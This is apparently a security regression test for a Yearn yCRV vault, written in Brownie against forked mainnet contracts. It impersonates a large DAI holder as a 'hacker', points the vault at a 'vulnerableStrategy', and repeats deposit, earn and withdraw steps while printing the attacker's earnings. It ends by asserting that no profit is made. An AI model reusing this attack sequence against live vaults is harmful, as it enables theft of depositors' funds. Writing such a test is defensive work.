def test_proxy_earn(accounts, ychad, Token, Contract, StrategyCurveYVoterProxy, StrategyProxy):
    # NOTE: This person has a ton of DAI, but flash loans could be used instead
    # Use Uniswap v2 WETH/DAI pool as it's the top DAI holder
    hacker = accounts.at('0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11', force=True)

    ycrv_zap = Contract("0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3")
    ycrv = Token.at("0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8")
    dai = Token.at("0x6B175474E89094C44Da98b954EedeAC495271d0F")
    vault = Contract.from_explorer("0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c")
    controller = Contract(vault.controller())
    vulnerableStrategy = Contract("0x594a198048501A304267E63B3bAd0f0638da7628")

    # Change strategy to vulnerableStrategy to steal funds
    controller.approveStrategy(
        "0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8",
        vulnerableStrategy,
        {"from": ychad},
    )
    controller.setStrategy(
        "0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8",
        vulnerableStrategy,
        {"from": ychad},
    )

    dai.approve(ycrv_zap, 2 ** 256 - 1, {"from": hacker})
    ycrv_zap.add_liquidity([dai.balanceOf(hacker), 0, 0, 0], 0, {"from": hacker})
    assert ycrv.balanceOf(hacker) > 0, "could not obtain ycrv"

    before = ycrv.balanceOf(hacker)
    ycrv.approve(vault, 2 ** 256 - 1, {"from": hacker})

    print(f"vault: {vault.balance() / 1e18:,.0f} yCRV ")
    print(f"hacker: {ycrv.balanceOf(hacker) / 1e18:,.0f} yCRV")

    vault.deposit(ycrv.balanceOf(hacker) // 2, {"from": hacker})
    vault.earn({"from": hacker, "gas_limit": 250000})
    vault.deposit(ycrv.balanceOf(hacker), {"from": hacker})
    vault.earn({"from": hacker})
    vault.withdraw(vault.balanceOf(hacker), {"from": hacker})

    print(f"hacker has earned: {(ycrv.balanceOf(hacker) - before) / 1e18:+,.0f}")

    assert ycrv.balanceOf(hacker) <= before
